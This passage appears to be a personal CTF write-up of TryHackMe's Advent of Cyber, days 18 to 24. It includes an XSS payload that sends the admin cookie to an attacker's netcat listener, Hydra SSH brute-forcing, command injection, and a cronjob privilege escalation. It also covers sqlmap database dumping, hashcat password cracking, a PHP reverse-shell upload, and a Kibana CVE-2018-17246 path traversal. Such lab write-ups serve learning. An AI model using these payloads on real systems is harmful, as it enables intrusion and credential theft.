[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking ssh://10.10.14.193:22/
[22][ssh] host: 10.10.14.193   login: molly   password: butterfly
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-05-14 22:19:50
kali@kali:~$ ssh molly@10.10.14.193
molly@ip-10-10-14-193:~$ ls
flag2.txt
molly@ip-10-10-14-193:~$ cat flag2.txt
```

# Day 18 : ELF JS 
```
McSkidy knows the crisis isn't over. The best thing to do at this point is OSINT

we need to learn more about the christmas monster

During their OSINT, they came across a Hacker Forum. Their research has shown them that this forum belongs to the Christmas Monster. Can they gain access to the admin section of the forum? They haven't made an account yet so make sure to register.

Access the machine at http://[your-ip-address]:3000 - it may take a few minutes to deploy.
```
READ [this](https://docs.google.com/document/d/19TJ6ANmM-neOln0cDh7TPMbV9rsLkSDKS3nj0eJaxeg/edit#)


## What is the admin's authid cookie value?
start by creating a account and log in to the forum. The plan is setting up a web server to recieve incoming cookie from the forum by using netcat (I learn this from BANDIT LV 20 so go check out). To setup the server, run ```nc -lvp 20000```. -l for listen, -v for verbose, and -p for port nummber.


Next craft the payload:
```js
<script>new Image().src='http://10.8.14.151:20000/cookie='+document.cookie;</script>
```
Then make setup the server and try to refresh the forum and see if you will recieve your cookie
```console
kali@kali:~$ nc -lvp 20000
listening on [any] 20000 ...
10.8.14.151: inverse host lookup failed: Unknown host
connect to [10.8.14.151] from (UNKNOWN) [10.8.14.151] 48702
GET /cookie=authid=9dd22399fb1f4fdacb008d861576680c4d34607b HTTP/1.1
Host: 10.8.14.151:20000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: image/webp,*/*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.165.251:3000/home
Connection: keep-alive
```
Yep it is working! so let run the server again and wait for admin to login!!
```console
kali@kali:~$ nc -lvp 20000
listening on [any] 20000 ...
10.10.165.251: inverse host lookup failed: Unknown host
connect to [10.8.14.151] from (UNKNOWN) [10.10.165.251] 37236
GET /cookie=authid=2564799XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX HTTP/1.1
Host: 10.8.14.151:20000
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/77.0.3844.0 Safari/537.36
Accept: image/webp,image/apng,image/*,*/*;q=0.8
Referer: http://localhost:3000/admin
Accept-Encoding: gzip, deflate
```
GLHF
# Day 19 : Commands
```
Another day, another hack from the Christmas Monster. Can you get back control of the system?

Access the web server on http://[your-ip]:3000/

McSkidy actually found something interesting on the /api/cmd endpoint.
```
READ [this](https://docs.google.com/document/d/1W65iKmUMtz-srteErhrGFJkWBXJ4Xk5PYlCZVMIZgs8/edit)

## What are the contents of the user.txt file?
We got a hit that we should check http://[your-ip]:3000/api/cmd/. I notice by the url name that it have something to do with ```cmd.exe```. So I start playing around by executing ```http://[your-ip]:3000/api/cmd/id``` and yes we found the vulnerability!! Command Injection. now try the following cmd to find the flag (hint: some where in ```/home```)
1. cat 
2. dir
3. dont forget URL encoding: %20 for space %2F for slash
GLHF
# Day 20 : Cronjob Privilege Escalation 
```
You think the evil Christmas monster is acting on Elf Sam's account!

Hack into her account and escalate your privileges on this Linux machine.
```
## What port is SSH running on?
```console
nmap -p- -A 10.10.50.118
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-15 22:49 EDT
Nmap scan report for 10.10.50.118
Host is up (0.045s latency).
Not shown: 65534 closed ports
PORT     STATE SERVICE VERSION
4XXX/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b9:fc:5a:a1:06:82:37:95:35:29:03:c1:34:fa:bc:99 (RSA)
|   256 36:e5:21:c9:83:8b:68:9d:30:bb:20:3c:6f:f7:fa:f4 (ECDSA)
|_  256 7b:88:cc:36:a0:f5:5a:79:3b:1c:a5:a8:e9:d2:d4:0d (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 111.42 seconds

```
## Crack sam's password and read flag1.txt
```console
kali@kali:~$ hydra -l sam -P /usr/share/wordlists/rockyou.txt 10.10.50.118 -s 4567 -t 4 ssh # crack password with hydra
kali@kali:~$ ssh sam@10.10.50.118 -p 4567 # ssh
sam@10.10.50.118's password: 
       .---.
      /     \
      \.@-@./
      /`\_/`\
     //  _  \\
    | \     )|_
   /`\_`>  <_/ \
   \__/'---'\__/
     tryhackme
sam@ip-10-10-50-118:~$ ls
flag1.txt
sam@ip-10-10-50-118:~$ cat flag1.txt
```

## Escalate your privileges by taking advantage of a cronjob running every minute. What is flag2?
after the enumeration, I found 2 insteresting files
```console
sam@ip-10-10-50-118:~$ ls -l /home/ubuntu/ # the flag2.txt is here, remember the ownership
total 4
-r-------- 1 ubuntu ubuntu 38 Dec 19 20:09 flag2.txt
sam@ip-10-10-50-118:~$ ls /home/scripts/ # 2nd file is .sh
clean_up.sh  test.txt
sam@ip-10-10-50-118:~$ cat /home/scripts/clean_up.sh #it remove everything in /tmp
rm -rf /tmp/*
sam@ip-10-10-50-118:~$ ls -la /home/scripts/ #own by ubuntu and it seem like we have permission to rwx
total 16
drwxrwxrwx 2 root   root   4096 Dec 19 20:55 .
drwxr-xr-x 5 root   root   4096 Dec 19 20:12 ..
-rwxrwxrwx 1 ubuntu ubuntu   14 Dec 19 20:55 clean_up.sh
-rw-r--r-- 1 root   root      5 Dec 19 20:55 test.txt
```
So the task is escalate our privileges by taking advantage of a cronjob... maybe the executing ```clean_up.sh``` is a part of the cronjob? let check it out
```console
sam@ip-10-10-50-118:~$ ls -la /tmp/ #so we can see the latest modified time
total 28
drwxrwxrwt  7 root root 4096 May 16 04:05 .
drwxr-xr-x 23 root root 4096 May 16 02:44 ..
drwxrwxrwt  2 root root 4096 May 16 02:43 .font-unix
drwxrwxrwt  2 root root 4096 May 16 02:43 .ICE-unix
drwxrwxrwt  2 root root 4096 May 16 02:43 .Test-unix
drwxrwxrwt  2 root root 4096 May 16 02:43 .X11-unix
drwxrwxrwt  2 root root 4096 May 16 02:43 .XIM-unix
sam@ip-10-10-50-118:~$ date # current time
Sat May 16 04:05:22 UTC 2020
```
Yes, the firt line show that the last access time is ```04:05``` and when executed date shows ```Sat May 16 04:05:22 UTC 2020```. The timestamp is show that **there is the cronjob running by ubuntu every minute**.


Since the ```clean_up.sh``` is own by ubuntu which is also the owner of ```flag2.txt```. we can use ```clean_up.sh``` to escalate our privilage and get the flag. we will edit the clean_up.sh and make it cat the content of flag2.txt for us. (CAN't copy since there is only read permission on flag2.txt -> ```-r-------- 1 ubuntu ubuntu 38 Dec 19 20:09 flag2.txt```)
```console
sam@ip-10-10-50-118:~$ nano /home/scripts/clean_up.sh 
```
add this:
```bash
# rm -rf /tmp/*
cat /home/ubuntu/flag2.txt > /home/sam/flag2.txt && chmod 777 /home/sam/flag2.txt
# note that I did chmod to make sure that we will have permission to open the the flie
```
now just cat the flag2.txt
```console
sam@ip-10-10-50-118:~$ cat flag2.txt 
THM{b27d33XXXXXXXXXXXXXXXXXXXXXXXXXX}
GLHF
```
# Day 21 : Reverse Elf-ineering 
```
McSkidy has never really touched low level languages - this is something they must learn in their quest to defeat the Christmas monster.

Download the archive and apply the command to the following binary files: chmod +x file-name

Please note that these files are compiled to be executed on Linux x86-64 systems.

The questions below are regarding the challenge1 binary file.
```
READ [this](https://drive.google.com/file/d/1maTcdquyqnZCIcJO7jLtt4cNHuRQuK4x/view?usp=sharing)
Use Ida pro freeware to solve
## What is the value of local_ch when its corresponding movl instruction is called(first if multiple)?
set break point after ```movl``` and point your mouse to ```local_ch```
## What is the value of eax when the imull instruction is called?
set break point after ```imull``` and point your mouse to ```eax```
## What is the value of local_4h before eax is set to 0?
set break point before ```mov eax 0``` can point ur mouse on ```local_4h```
# Day 22 : If Santa, Then Christmas 
```
McSkidy has been faring on well so far with assembly - they got some inside knowledge that the christmas monster is weaponizing if statements. Can they get ahead of the curve?

These programs have been compiled to be executed on Linux x86-64 systems.
The questions below relate to the if2 binary.
```
READ [this](https://docs.google.com/document/d/1cIHd_YQ_PHhkUPMrEDWAIfQFb9M9ge3OFr22HHaHQOU/edit)
sry but im so lazy to write this one, the tips is u use IDA and set a break after the if statement and point to different ```local_Xh```

# Day 23 : LapLANd (SQL Injection) 
```
Santa’s been inundated with Facebook messages containing Christmas wishlists, so Elf Jr. has taken an online course in developing a North Pole-exclusive social network, LapLANd! Unfortunately, he had to cut a few corners on security to complete the site in time for Christmas and now there are rumours spreading through the workshop about Santa! Can you gain access to LapLANd and find out the truth once and for all?
```
READ [this](https://docs.google.com/document/d/15XH_T1o6FLvnV19_JnXdlG2A8lj2QtepXMtVQ32QXk0/edit)

## Which field is SQL injectable? Use the input name used in the HTML code.
we gonna use sqlmap with ```-r``` which is REQUESTFILE -> Load HTTP request from a file. To get the request, we run Burpsuite and intercept the post request when you tryo to login the web app. Copy the reqest and put it in a .txt:
```console
kali@kali:~$ mkdir day23 && cd day23
kali@kali:~/day23$ nano login.txt # put the content of the post request in this file
kali@kali:~$ sqlmap -r day23/login.txt --dbs --batch # run sqlmap --dbs is Enumerate DBMS databases
OST parameter 'XXXXXX' is a false positive
POST parameter 'XXXXXXX' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 434 HTTP(s) requests:
---
Parameter: log_email (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: log_email=gu2@test1.com' AND 2264=2264 AND 'WCZD'='WCZD&log_password=test123&login_button=Login

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: log_email=gu2@test1.com' AND (SELECT 4668 FROM (SELECT(SLEEP(5)))sjKy) AND 'zSeO'='zSeO&log_password=test123&login_button=Login
---
[22:51:27] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
[22:51:27] [INFO] fetching database names
[22:51:27] [INFO] fetching number of databases
[22:51:27] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[22:51:27] [INFO] retrieved: 6
[22:51:28] [INFO] retrieved: information_schema
[22:51:37] [INFO] retrieved: mysql
[22:51:39] [INFO] retrieved: performance_schema
[22:51:48] [INFO] retrieved: phpmyadmin
[22:51:54] [INFO] retrieved: social
[22:51:57] [INFO] retrieved: sys
available databases [6]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] phpmyadmin
[*] social
[*] sys
```
find out what XXXXX is and you will be fine
## What is Santa Claus' email address?
before doing this task, I would like you to log in to the web app and try out. try to understand what this web app is for and how to it work. 


from the last task, we know that there is 6 databases. the web app is like a social media app so I pick to try to find out what is in side ```social``` database
```console
kali@kali:~$ sqlmap -r day23/login.txt -D social --tables --batch # --tables == get table -D is DBMS database to enumerate
Database: social
[8 tables]
+-----------------+
| comments        |
| friend_requests |
| likes           |
| messages        |
| notifications   |
| posts           |
| trends          |
| users           |
+-----------------+
```
users table looks **juicy**, let get all columns
```console
kali@kali:~/day23$ sqlmap -r login.txt -D social -T users --columms --batch
[12 columns]
+--------------+--------------+
| Column       | Type         |
+--------------+--------------+
| id           | int(11)      |
| password     | varchar(255) |
| email        | varchar(100) |
| first_name   | varchar(25)  |
| friend_array | text         |
| last_name    | varchar(25)  |
| num_likes    | int(11)      |
| num_posts    | int(11)      |
| profile_pic  | varchar(255) |
| signup_date  | date         |
| user_closed  | varchar(3)   |
| username     | varchar(100) |
+--------------+--------------+
```
On the web app when you search for a user in search bar, you can either search for name or username, I already know that Santa's username is ```santa_claus```. Moreover, we need to get his password for next task so lets **dump both password and username**
```console
sqlmap -r login.txt -D social -T users -C username,password,email --batch --dump --threads 3 # -C DBMS database table column(s) to enumerate -dump dump the data --threads is threads to incresse speed (not recomended irl)
```
## What is Santa Claus' plaintext password?
Get the password and use some [Hash Analyzer](https://www.tunnelsup.com/hash-analyzer/) to find out what hash algorithms is used. let go **hashcat**!!!
```console
kali@kali:~/day23$ hashcat -m 0 -a 0 -o santacrack.txt "putthehashhere" /usr/share/wordlists/rockyou.txt --force
kali@kali:~/day23$ cat santacrack.txt
```

## Santa has a secret! Which station is he meeting Mrs Mistletoe in?
use the Santa's cerdentail and login to the web app. check the messages
## Once you're logged in to LapLANd, there's a way you can gain a shell on the machine! Find a way to do so and read the file in /home/user/
I tried to upload the revers-shell.php in ```/usr/share/webshells/php``` none of them works. So I try to do some research a [walkthrought by embeddedhacker](https://www.embeddedhacker.com/2019/12/hacking-walkthrough-thm-cyber-of-advent/#day23) said that we need a older version of ```php``` so call ```.phtml``` which you can download [here](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php)

save it and change ip to ur ip and port
```console
kali@kali:~/day23$ nc -lnvp 20000 # run netcat using the port that you wrote in the script
listening on [any] 20000 ...
```
now upload our payload (reverse-shell scrip)
```console
$ whoami
www-data
$ ls /home
user
$ ls /home/user
flag.txt
$ cat /home/user/flag.txt
@@@########################################################################@@@@
@@@(((((((((((((((((((((((((((((((((((%#(((((((((((((((((((((((((((((((((((@@@@
@@@(((((((((((((((((((((((((((((((((%%,*%%(((((((((((((((((((((((((((((((((@@@@
@@@((((((((((((((((((&%(((((((((((%#*/##(((((((((((#@%%((((((((((((((((((@@@@
@@@(((((((((((((((((((%(//%((((((#(//,*%%((((((#/,(#(((((((((((((((((((@@@@
@@@((((((((((((((((((((#(*%#/##,*#&%%%&%%,*%###%%/*&(((((((((((((((((((((@@@@
@@@(((((((((((((((((((((#(&@(*(#(##%&%#%%%%#((%,*%&((((((((((((((((((((((((@@@@
@@@(((((((((((((((((((((((@%%((#(**/*#,*(*//*/(((%%@(((((((((((((((((((((((@@@@
@@@(((((((((((((((((((((((%%#(##,#**,##%#,*(#*#((%%#(((((((((((((((((((((((@@@@
@@@(((((((((((((((((((((((#/#*(,*/((((((((((/****%*%(((((((((((((((((((((((@@@@
@@@(((((((((((((((((((((((#(&/,,,,,,,,,,,,,,/%&&/#(((((((((((((((((((((((@@@@
@@@((((((((((((((((((((((((#&((##(/********/(#(((&%((((((((((((((((((((((((@@@@
@@@((((((((((((((((((((((((((((((((########((((((((((((((((((((((((((((((((@@@@
@@@(((((((((((((((((((((((((((((((((#((((((((((((((((((((((((((((((((((((((@@@@
@@@(((((((((((((((((((((((((%/((,     .      *##/%(((((((((((((((((((((((((@@@@
@@@((((((((%((((((%((((((%###  .      .       .  %%(%((((((%((((((&((((((((@@@@
@@@((((((%/,##((%/ #(((((%###  .   .  .       .. %%#%(((((&.(&((%( (#((((((@@@@
@@@(((((#*,(%*%,%%/ (##((%###  .  .   .        * %%#%(((%# (%###(%( #((((((@@@@
@@@((#%%.*#%,*#,/((# %(#%%### /*,./..*..,/ , ,*/ %%#%#%(/ (%,%/,%.(#,*##%((@@@@
@@@(((# #(#,/(*(#./## /((%### /*/%&&,(..,/#,%.(  %%#%(#./%#,/%.(%,(##* #(((@@@@
@@%#((#(/##%/%%(#%#%(%###.**.,*,.*.,,. **.*  %%#%(%#%#/%&*%%*&%((#((##@@@
@@&%(((#,##(*#%/%(,## #((%###  .(     .    ,. .  %%#%((#.#((,%(*%(,##.((((#&@@@
@@@@((((# %#,/#,#/(#(((((%###  .      .       .  %%#%(((((,#*#*#/,(% #((((&@@@@
@@@&((((((%#&,#(/%(((((%###..,/#####&%#####*. .%%#%(((((##&*##.%##((((((@@@@@
@@@@&((((((##(((#%(((((((%#(####//(##%@&%###((####(#%((((((###((###((((((%#@@@@
@@@@@((((((((((((((((((((#%%%%%%%%%%%%%#%%%%%%%%%%%%%((((((((((((((((((((@,@@@@
@@@@&@(((((((((((((((((((((((((((((((##%(#((((((((((((((((((((((((((((((#.@@@@@
@@@@@ #((((((((((((((((((((((((((((%/%&&%%##((((((((((((((((((((((((((((@@@@@@@
@@@@@@@#(((((((((((((((((((((((((%.( /%@,( (/#(((((((((((((((((((((((((@@@@@@@@
@@@@@@@&((((((((((((((((((((((%#.(   /&%*/   (.(%(((((((((((((((((((((@%@@@@@@@
@@@@@@@@%%((((((((((((((((#&(#.* . ** /@./,,.. / &(%((((((((((((((((#@,@@@@@@@@
@@@@@@@@@.&(((((((((((((((&@@&%, /#,  /%, .#&@@@%%#((((((((((((((%#@@@@@@@@@@
@@@@@@@@@@%@((((((((((((((#&..,,%&@. #//(( /@@#., ,(((((((((((((@%@@@@@@@@@@@
@@@@@@@@@@@@@&(((((((((((((#,(  ,,,,#(/(#&@(,,.  /#(((((((((((((&%@@@@@@@@@@@@@
%%#%&%@@@@@@@@&%((((((((((((#,(   *,  ,&.   ,., /#((((((((((((%@#@@@@@@@@&&%%%&
/***/*%@@@@@@@@*&&(((((((((((%*  .#%@  ((*%&*, .,#((((((((((&@@@@@@@@@&***,**
@#(,(%#@@@@@@@@@@*%@(((((((((#./,@&@. *,*.*@@#*,/(((((((((& @@@@@@@@@@@@@%#*((@
&/#%//&@@@@@@@@@@@@@,&&(((((((%#&@((       .%@##&(((((#@(#@@@@@@@@@@@@@@@/%(((&
#(/,,#&%@@@@@@@@@@@@@(%@(((((#%(%.,(#%#(,(%&(((#@.@@@@@@@@@@@@@@%%#,..(%*##
&((&*%##*/.   ,*#%%#&%/&%@ /@((((((((((((((((#@@@@@@(&%&%%(/,.    ,/# %,@@/%%
 %/,(,,#,%@,.&*%(,%(//&%@@@@@@@@@%#((((#&@&@@@@@@@@.#%%*%.( &*@..@@*%%%#*%%
@@#%*,*%*(& /( *&/%#&*,..@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@,/#&(@. *(&(%./(*../@@@@
@@@@@@@#,  . ,*,%.@*(##&%#&@@@@@@@@@@@@@@@@@@@@@@@@@#%%(((#,(&,/     ,#&%@@@@@@
@@@@@@@@@@@@@@ #%@%%&(@/%**,,*(#%#@&&%%&&@#%##*,...*#/@/(#@%%, @@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@/*&,%,*#//%.**.(. ##..(%*(.,@,#@//#%@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@&%(@%#,##&**%(&/,@ @.@& &. */..@(*@%(#%@@@@@@@@@@@@@@@@@@@@
```
GL
# Day 24 : Elf Stalk 
```
McDatabaseAdmin has been trying out some new storage technology and came across the ELK stack(consisting of Elastic Search, Kibana and Log Stash). 

The Christmas Monster found this insecurely configured instance and locked McDatabaseAdmin out of it. Can McSkidy help to retrieve the lost data?

While this task does not have supporting material, here is a general approach on how to go about this challenge:

1. scan the machine to look for open ports(specific to services running as well)
2. as with any database enumeration, check if the database requires authentication. If not, enumerate the database to check the tables and records
3. for other open ports, identify misconfigurations or public exploits based on version numbers
```
[Elastic Search](https://youtu.be/yZJfsUOHJjg)
[LK stack](https://youtu.be/Hqn5p67uev4)
let start with nmap
```console
kali@kali:~/day24$ nmap -p- -A 10.10.41.211  > target.txt nmap and put it in .txt
kali@kali:~/day24$ cat target.txt # show the result
```
* 8000 = http server contain kibana-log.txt
* 5061 = kibana
* 111 rpcbind
* 22 ssh
* 9200 Elasticsearch REST API 6.4.2
```json
{
  "name" : "sn6hfBl",
  "cluster_name" : "elasticsearch",
  "cluster_uuid" : "zAlVFkDaQlSBTQkLCqWJCQ",
  "version" : {
    "number" : "6.4.2",
    "build_flavor" : "default",
    "build_type" : "rpm",
    "build_hash" : "04711c2",
    "build_date" : "2018-09-26T13:34:09.098244Z",
    "build_snapshot" : false,
    "lucene_version" : "7.4.0",
    "minimum_wire_compatibility_version" : "5.6.0",
    "minimum_index_compatibility_version" : "5.0.0"
  },
  "tagline" : "You Know, for Search"
}
```
* 9300 tcp open  vrace?
## Find the password in the database
Nmap tell us the 9200 is Elasticsearch so try to search for password. I found a good link about Elasticsearch 101 [here](http://joelabrahamsson.com/elasticsearch-101/)
so to search : ```http://localhost:9200/_search=q?somthing``` and that something is password -> ```http://<target>:9200/_search?q=password```
```json
{"took":18,"timed_out":false,"_shards":{"total":6,"successful":6,"skipped":0,"failed":0},"hits":{"total":1,"max_score":2.0136302,"hits":[{"_index":"messages","_type":"_doc","_id":"73","_score":2.0136302,"_source":{"sender": "mary", "receiver": "wendy", "message": "hey, can you access my dev account for me. My username is l33tperson and my password is 9Qs58Ol3Axxxxxxxxx"}}]}}
```
## Read the contents of the /root.txt file
seem like Mary here is a dev and she have a dev account for kibana so let go to port 5600 and find out what we can do with her account.
in the hint from THM said ```use the 3rd open port and a Kibana public vulnerability``` so I guess we need to find a vulnerability and use it. to find the vuln we need to know the version of the kibana by click on Management, TADA!!! ```Kinaba Version: 6.4.2```


after some diging I found this [Kinaba vuln](https://www.cvedetails.com/vulnerability-list.php?vendor_id=13554&product_id=31867&version_id=0&page=1&hasexp=0&opdos=0&opec=0&opov=0&opcsrf=0&opgpriv=0&opsqli=0&opxss=0&opdirt=0&opmemc=0&ophttprs=0&opbyp=0&opfileinc=0&opginf=0&cvssscoremin=0&cvssscoremax=0&year=0&cweid=0&order=1&trc=25&sha=c5983189c1dccb302ad8263fc4e2c471dbb67b96). There are so many vulnerabilities but we are looking for a critical one since the task is getting root and it seem like this one is intressing and it works for 6.4.2 too. it said:
```
Vulnerability Details : CVE-2018-17246	
Kibana versions before 6.4.3 and 5.6.13 contain an arbitrary file inclusion flaw in the Console plugin. An attacker with access to the Kibana Console API could send a request that will attempt to execute javascript code. This could possibly lead to an attacker executing arbitrary commands with permissions of the Kibana process on the host system. 
```
So it allow us to send a request that will attemp to execture js code. BING GO! another revers shell task? after some diging I found this [link](https://github.com/mpgn/CVE-2018-17246) which leed me to [CyberArk Labs](https://www.cyberark.com/threat-research-blog/execute-this-i-know-you-have-it/) the guy who found this vuln, I guess.


after reading it so I try to use the this payload ```http://<IP>:5601/api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../../../../../../../etc/passwd``` and see how Kibana response. We alrady know that we can access the Kibana log from port 8000. So I open ```http://<ip:8000/kibana-log.txt``` and find ```etc/passwd``` inside the log: the result is shows here:
```json
{"type":"error","@timestamp":"2020-05-19T23:43:07Z","tags":["warning","process"],"pid":2700,"level":"error","error":{"message":"Unhandled promise rejection. This error originated either by throwing inside of an async function without a catch block, or by rejecting a promise which was not handled with .catch(). (rejection id: 9)","name":"UnhandledPromiseRejectionWarning","stack":"SyntaxError: /etc/passwd: Unexpected token, expected ; (1:8)\n> 1 | root:x:0:0:root:/root:/bin/bash\n    |         ^\n  2 | bin:x:1:1:bin:/bin:/sbin/nologin\n  3 | daemon:x:2:2:daemon:/sbin:/sbin/nologin\n  4 | adm:x:3:4:adm:/var/adm:/sbin/nologin\n    at Parser.pp$5.raise (/usr/share/kibana/node_modules/babylon/lib/index.js:4454:13)\n    at Parser.pp.unexpected (/usr/share/kibana/node_modules/babylon/lib/index.js:1761:8)\n    at Parser.pp.semicolon (/usr/share/kibana/node_modules/babylon/lib/index.js:1742:38)\n    at Parser.pp$1.parseExpressionStatement (/usr/share/kibana/node_modules/babylon/lib/index.js:2236:8)\n    at Parser.parseExpressionStatement (/usr/share/kibana/node_modules/babylon/lib/index.js:5934:20)\n    at Parser.pp$1.parseStatement (/usr/share/kibana/node_modules/babylon/lib/index.js:1911:17)\n    at Parser.parseStatement (/usr/share/kibana/node_modules/babylon/lib/index.js:5910:22)\n    at Parser.pp$1.parseLabeledStatement (/usr/share/kibana/node_modules/babylon/lib/index.js:2228:20)\n    at Parser.pp$1.parseStatement (/usr/share/kibana/node_modules/babylon/lib/index.js:1909:17)\n    at Parser.parseStatement (/usr/share/kibana/node_modules/babylon/lib/index.js:5910:22)\n    at Parser.pp$1.parseLabeledStatement (/usr/share/kibana/node_modules/babylon/lib/index.js:2228:20)\n    at Parser.pp$1.parseStatement (/usr/share/kibana/node_modules/babylon/lib/index.js:1909:17)\n    at Parser.parseStatement (/usr/share/kibana/node_modules/babylon/lib/index.js:5910:22)\n    at Parser.pp$1.parseBlockBody (/usr/share/kibana/node_modules/babylon/lib/index.js:2268:21)\n    at Parser.pp$1.parseTopLevel (/usr/share/kibana/node_modules/babylon/lib/index.js:1778:8)\n    at Parser.parse (/usr/share/kibana/node_modules/babylon/lib/index.js:1673:17)\n    at parse (/usr/share/kibana/node_modules/babylon/lib/index.js:7305:37)\n    at File.parse (/usr/share/kibana/node_modules/babel-register/node_modules/babel-core/lib/transformation/file/index.js:517:15)\n    at File.parseCode (/usr/share/kibana/node_modules/babel-register/node_modules/babel-core/lib/transformation/file/index.js:602:20)\n    at /usr/share/kibana/node_modules/babel-register/node_modules/babel-core/lib/transformation/pipeline.js:49:12\n    at File.wrap (/usr/share/kibana/node_modules/babel-register/node_modules/babel-core/lib/transformation/file/index.js:564:16)\n    at Pipeline.transform (/usr/share/kibana/node_modules/babel-register/node_modules/babel-core/lib/transformation/pipeline.js:47:17)\n    at Object.transformFileSync (/usr/share/kibana/node_modules/babel-register/node_modules/babel-core/lib/api/node.js:152:10)\n    at compile (/usr/share/kibana/node_modules/babel-register/lib/node.js:118:20)\n    at loader (/usr/share/kibana/node_modules/babel-register/lib/node.js:144:14)\n    at Object.require.extensions.(anonymous function) [as .js] (/usr/share/kibana/node_modules/babel-register/lib/node.js:154:7)\n    at Module.load (module.js:565:32)\n    at tryModuleLoad (module.js:505:12)"},"message":"Unhandled promise rejection. This error originated either by throwing inside of an async function without a catch block, or by rejecting a promise which was not handled with .catch(). (rejection id: 9)"}
```
As you can see. We get the content of ```/etc/passwd``` by reading the log. After some poking and diging around I found out that the ```root.txt``` is at root directroty (```/``` not ```/root```) so try ```http://<IP>:5601/api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../../../../../../../root.txt```
```json
{"type":"error","@timestamp":"2020-05-19T23:46:30Z","tags":["warning","process"],"pid":2700,"level":"error","error":{"message":"Unhandled promise rejection. This error originated either by throwing inside of an async function without a catch block, or by rejecting a promise which was not handled with .catch(). (rejection id: 12)","name":"UnhandledPromiseRejectionWarning","stack":"ReferenceError: someELKfun is not defined\n    at Object.<anonymous> (/root.txt:1:6)\n    at Module._compile (module.js:652:30)\n    at loader (/usr/share/kibana/node_modules/babel-register/lib/node.js:144:5)\n    at Object.require.extensions.(anonymous function) [as .js] (/usr/share/kibana/node_modules/babel-register/lib/node.js:154:7)\n    at Module.load (module.js:565:32)\n    at tryModuleLoad (module.js:505:12)\n    at Function.Module._load (module.js:497:3)\n    at Module.require (module.js:596:17)\n    at require (internal/module.js:11:18)\n    at /usr/share/kibana/src/core_plugins/console/api_server/server.js:19:19\n    at arrayEach (/usr/share/kibana/node_modules/lodash/index.js:1289:13)\n    at Function.<anonymous> (/usr/share/kibana/node_modules/lodash/index.js:3345:13)\n    at resolveApi (/usr/share/kibana/src/core_plugins/console/api_server/server.js:16:20)\n    at handler (/usr/share/kibana/src/core_plugins/console/index.js:115:41)\n    at Object.internals.handler (/usr/share/kibana/node_modules/hapi/lib/handler.js:96:36)\n    at request._protect.run (/usr/share/kibana/node_modules/hapi/lib/handler.js:30:23)\n    at module.exports.internals.Protect.internals.Protect.run (/usr/share/kibana/node_modules/hapi/lib/protect.js:64:5)\n    at exports.execute (/usr/share/kibana/node_modules/hapi/lib/handler.js:24:22)\n    at each (/usr/share/kibana/node_modules/hapi/lib/request.js:384:16)\n    at iterate (/usr/share/kibana/node_modules/items/lib/index.js:36:13)\n    at done (/usr/share/kibana/node_modules/items/lib/index.js:28:25)\n    at Hoek.once (/usr/share/kibana/node_modules/hapi/lib/protect.js:52:16)\n    at wrapped (/usr/share/kibana/node_modules/hoek/lib/index.js:879:20)\n    at done (/usr/share/kibana/node_modules/items/lib/index.js:31:25)\n    at Function.wrapped [as _next] (/usr/share/kibana/node_modules/hoek/lib/index.js:879:20)\n    at Function.internals.continue (/usr/share/kibana/node_modules/hapi/lib/reply.js:108:10)\n    at method (/usr/share/kibana/node_modules/x-pack/plugins/dashboard_mode/server/dashboard_mode_request_interceptor.js:44:7)\n    at Items.serial (/usr/share/kibana/node_modules/hapi/lib/request.js:403:22)"},"message":"Unhandled promise rejection. This error originated either by throwing inside of an async function without a catch block, or by rejecting a promise which was not handled with .catch(). (rejection id: 12)"}
```


# Sum up
It took me many days do finish this room. I have been sleeping at 5-6 am this past two week and spending time on CTF and hacking. It was worth it !! I learn a lot in short time. I will keep doing it but will try my best to not forget to sleep. I special thank to [embeddedhacker](https://www.embeddedhacker.com/2019/12/hacking-walkthrough-thm-cyber-of-advent/) to help me out when Im stuck. I do try my best to do it by my own but some task I do need a push. So do not be ashame if you need to read a writeup/walkthought. But you need to understand what you are doing, try to read and research more, not just copy and paste it. We are noob but we will learn and become a Senpai one day.